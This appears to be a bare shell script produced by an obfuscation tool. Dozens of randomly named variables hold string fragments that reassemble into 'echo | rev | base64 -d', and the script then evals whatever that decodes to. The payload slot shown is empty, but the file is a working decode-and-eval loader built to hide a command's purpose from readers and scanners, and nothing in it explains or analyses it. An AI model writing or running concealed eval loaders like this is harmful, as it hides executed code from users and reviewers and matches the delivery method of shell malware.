ITorXuQGdSdhhrzpqqygFkhkgJPCZdxsWrSgUErGkFXmXuTEhZyHiOHsyoNzGySnVuxymZmVUeedwwcUiimRDXqcJfPcOgpLwdKq="uSDLIFMisCDMxtAwktMyZCpXpFCKnbDulqCsQOvTgtgMfiWMSFEalFFrmhPyviMTwxXLFgkpYzsEzdvZsDIPZZvoQnklSoTUhdxc";laEmWCTCfMNnmKebRSygbHtDGvQCJXmopXEpZdXuAFuWcPsdrHvOcPJOHYodDhEocLMxhGWferNvbCWaheCYeBvyoxGhcYXggtpL="RHVjlHuMCnnJdPwmLRTxSzdHkYNMIsFwdyQiyEGoOyxZsbMXFLLoKLuilfcJrGXQkMPnOthUVcOfuJNwzebDeTyqYaSCtIjYQqbU";NqZYfzCIeqOnumtHTsotXOeRFqvaRkjrwDKXTLDrRLvNwVbJcuggtcXUyNOGROxIWnkzPjDxVRTsVNVylHWdVvOzEpmZsFZlbcuy="ch";VeiFVuNxrvCfYekOuEPFegiNxAGJTZHTFKSgvHeKwliMXjssDSSlDVsbTmKFXXcvGjgDMflQGOevjxVFAEkNBDAsrqHFvxaONINc="4";pKphMeQbijfVBeAYdBNAAoRdZFpBItobeDvywmRUWHoBUWFXbJNsquGyBvhrYetQqwZNzsvxWGYlEwpFMwsenAWkNylAAXJutJRd="";YJmzmUpCniaHkvOABhGsnyZzWYsfmoHOdmSpFCiQMIsPnkjkhfcixiNAdVnkPadWAPuBXFWCIKTtsIIzPTagpgfNvZoUbJqFeemI="yHEgICBJQPhAJgfjDDyxxOZUAHSHXztFXRzFRGpPnvNSObGBleRaNjKvZbfDNERWkwDxTuDHcKNyjWByNQOkVkfMhszwsuiNezKG";chBmcAnfEAdaqRyZcYpttVwtrxaAFPBJmQRyfThaCiJFEsmAXoYTjciUoxvWdPREpsJtKLQfOIbJrINIqfypTFuuSKHkeppVaanS="  | r";kWtXpNyPagMANxeMBUxqGkWJsdVUiCMgvpzcRpGjxktpZmRuhLJCJEOzupfCBABedPyxvUmpCcdAVuklZTChfKTXLwinRtYxSchh="WkyEVEqqGvfknRZTJObglcgDvRiqqGjELOkvuzBGpxGJAqyidIoulKSoCByJOtoTfCeHvpWpqvejAHcnlhVBKOBAzRlChPBkPkTt";RZHeSDhQCbQdRedHuMmhtojckmzWugVqkwNGxHvproxTtsCwklkilggTzEAPLgnRyAdIdysFRgHhfrUtkrrLDyFRwQDfuAvtJzzV="";OwvfkNhHbKmGzrPPrmiUAwEYXKkvSszwBrjJXEodTKINYczDjbIBbLwvJcLRKEDiGrudrkTTygqjSDLjZZrsiDHUzMTHbcSdPssU="as";kxhcRBFuMqjffqRSSJXADFGnIXsQVsbQGZkbpNKHXAHUgOTbWWyImhczRHseaHnHMuvdDOYMbXBsaISKQcWznNwtENiKCzZwMnDu="WrNUxYSCHGweiYKowKSVAJKLqKFRCILaLYZUJLYwPdOUAumAHvXQlbrhGsEnFfqMGqfqmvGDKrfuZuXSlntkOPFaUMLSQPvppQCW";NBbRnYRLuBoAgVVWAGdSUyaWDigqhtIUNkiRvrFOQpAZWOwXEsvbCCLiFzvZaISgVyaIPPeUJaMbsfZZYHMdCwemltPLDtqgwnZm="RyKYGbxfmkYqqSVkazWsdCaBSRASsICztsWriqnQftDsAvdlAqOVfCfYhULimrIlExzszYUSTDVYcsvBpDYucKabBzOlGpSvaDqH";GtfhgDdJRZuIvUUAKXtUJqZRPvklSbvNChwxmMMEZwsHnEDjbItSYtbnkONAaObBckzsvJEJprjtkTLPKcaYKWlowbVPUAcThDkY="o";YEiGgFjVMghdJNOaetahPiklfsHsIgTdXYyKHdYTTlYolEzfDnAMYFerbFyrNagfrQfIonBVvUHRNmbakNyXdPiOHMkEyBEKumiD="6";DWBBcTBwTioDUkyxeYXbCEwaqVyNOwNZcBQMAqQOaXUWGWNyzfEfSUyiATXCaFPvpbmKmvTGlwZYzXEwiVVQRNhKspDHIwCGbneR="nlEScAxNBYNsTHNSHcLzWHqWjCkmKpfXTZacrPpqymnEgFKdcjrmbwiJJxjHUWbAnHvFjukzFgKnnNOgydxqYkysSSlvwyIVqYxY";tjcRhaHXKhuyQnzNOrzymVCZtViehSFkFtyfcPukhaidoqSZJtOknuHyYHQQSYqihaUVmZUbSyuCxaVehewmuGuSEMebXuMKEero=" -d";QGiUONOJBeSXJUtRFZqGLSqldWacsHytedcBEbuqmqIJjEmPoTLjrHGOquNdOhHuLAHAgOndpukTSkAwemrTwKFbDFPtbmvgHWHE="VfhhEuynCcwCpMttNSQQqaFKdmmhBaGSZFplBFmbiHIFQvFRSHdxDjfIVLHeTyANBywTBgMKYyJbrnvYVkAHddyPTAtFTovbLmHV";VyujMptsOholVXsikhiAkemroezMBAYvWkCINLMtgDPBMwRGIwQZEwhlRPbsFJpeYEtfThSLihAmkgddQoCNfrYhUDopaRVCEDYY="";aCWGewAmEAFkNrgBSKluEkvtsCboLFwvrdkuqiDlAScWrATTJDBCGXzULgjeeZBrPRpcFjzeIRLTvxLujStKOXdkUURYjnfryftm="b";DrOEadvvSWMOKTSQwmDELVNictKjWJvXwzUpmPahImLmVjhLXezycIZtHElPqiVGxioonaCympDxLKOXgYifDzNlhZtYfbAUyoGi="e";LlYByXiQFaeBuaDgcGkrGIRWNUbOqvrlMPuNTJiABNgzgXGGGHKqsJXqHWwzSUCwQHZNZvcdrxCyJVNQWbFfNxbeXUPedgWlRpGs="v |";Tx=Eds;qMCNVVRfruLGpyrhlkcAjykjzkcIhucHNBamzzHWZYNEfLkGBozwtDCcXpoNaWJQrfKoBxsZIVvnabUtgiwnnNpshDdYFryQdQEd="";AjgyRhaQPEQcrQMsEuWqsDatmBNfiLbKnvVPDdBtqnqGcRpxMRftbNkIhwTLavGHXXVcZeaQEusYcOZRMNvBETUBILCgCHUkAurs=$(eval "$RZHeSDhQCbQdRedHuMmhtojckmzWugVqkwNGxHvproxTtsCwklkilggTzEAPLgnRyAdIdysFRgHhfrUtkrrLDyFRwQDfuAvtJzzV$DrOEadvvSWMOKTSQwmDELVNictKjWJvXwzUpmPahImLmVjhLXezycIZtHElPqiVGxioonaCympDxLKOXgYifDzNlhZtYfbAUyoGi$NqZYfzCIeqOnumtHTsotXOeRFqvaRkjrwDKXTLDrRLvNwVbJcuggtcXUyNOGROxIWnkzPjDxVRTsVNVylHWdVvOzEpmZsFZlbcuy$pKphMeQbijfVBeAYdBNAAoRdZFpBItobeDvywmRUWHoBUWFXbJNsquGyBvhrYetQqwZNzsvxWGYlEwpFMwsenAWkNylAAXJutJRd$GtfhgDdJRZuIvUUAKXtUJqZRPvklSbvNChwxmMMEZwsHnEDjbItSYtbnkONAaObBckzsvJEJprjtkTLPKcaYKWlowbVPUAcThDkY$chBmcAnfEAdaqRyZcYpttVwtrxaAFPBJmQRyfThaCiJFEsmAXoYTjciUoxvWdPREpsJtKLQfOIbJrINIqfypTFuuSKHkeppVaanS$DrOEadvvSWMOKTSQwmDELVNictKjWJvXwzUpmPahImLmVjhLXezycIZtHElPqiVGxioonaCympDxLKOXgYifDzNlhZtYfbAUyoGi$LlYByXiQFaeBuaDgcGkrGIRWNUbOqvrlMPuNTJiABNgzgXGGGHKqsJXqHWwzSUCwQHZNZvcdrxCyJVNQWbFfNxbeXUPedgWlRpGs$RZHeSDhQCbQdRedHuMmhtojckmzWugVqkwNGxHvproxTtsCwklkilggTzEAPLgnRyAdIdysFRgHhfrUtkrrLDyFRwQDfuAvtJzzV$aCWGewAmEAFkNrgBSKluEkvtsCboLFwvrdkuqiDlAScWrATTJDBCGXzULgjeeZBrPRpcFjzeIRLTvxLujStKOXdkUURYjnfryftm$qMCNVVRfruLGpyrhlkcAjykjzkcIhucHNBamzzHWZYNEfLkGBozwtDCcXpoNaWJQrfKoBxsZIVvnabUtgiwnnNpshDdYFryQdQEd$OwvfkNhHbKmGzrPPrmiUAwEYXKkvSszwBrjJXEodTKINYczDjbIBbLwvJcLRKEDiGrudrkTTygqjSDLjZZrsiDHUzMTHbcSdPssU$DrOEadvvSWMOKTSQwmDELVNictKjWJvXwzUpmPahImLmVjhLXezycIZtHElPqiVGxioonaCympDxLKOXgYifDzNlhZtYfbAUyoGi$YEiGgFjVMghdJNOaetahPiklfsHsIgTdXYyKHdYTTlYolEzfDnAMYFerbFyrNagfrQfIonBVvUHRNmbakNyXdPiOHMkEyBEKumiD$pKphMeQbijfVBeAYdBNAAoRdZFpBItobeDvywmRUWHoBUWFXbJNsquGyBvhrYetQqwZNzsvxWGYlEwpFMwsenAWkNylAAXJutJRd$VeiFVuNxrvCfYekOuEPFegiNxAGJTZHTFKSgvHeKwliMXjssDSSlDVsbTmKFXXcvGjgDMflQGOevjxVFAEkNBDAsrqHFvxaONINc$tjcRhaHXKhuyQnzNOrzymVCZtViehSFkFtyfcPukhaidoqSZJtOknuHyYHQQSYqihaUVmZUbSyuCxaVehewmuGuSEMebXuMKEero$qMCNVVRfruLGpyrhlkcAjykjzkcIhucHNBamzzHWZYNEfLkGBozwtDCcXpoNaWJQrfKoBxsZIVvnabUtgiwnnNpshDdYFryQdQEd");eval "$VyujMptsOholVXsikhiAkemroezMBAYvWkCINLMtgDPBMwRGIwQZEwhlRPbsFJpeYEtfThSLihAmkgddQoCNfrYhUDopaRVCEDYY$AjgyRhaQPEQcrQMsEuWqsDatmBNfiLbKnvVPDdBtqnqGcRpxMRftbNkIhwTLavGHXXVcZeaQEusYcOZRMNvBETUBILCgCHUkAurs$RZHeSDhQCbQdRedHuMmhtojckmzWugVqkwNGxHvproxTtsCwklkilggTzEAPLgnRyAdIdysFRgHhfrUtkrrLDyFRwQDfuAvtJzzV$pKphMeQbijfVBeAYdBNAAoRdZFpBItobeDvywmRUWHoBUWFXbJNsquGyBvhrYetQqwZNzsvxWGYlEwpFMwsenAWkNylAAXJutJRd"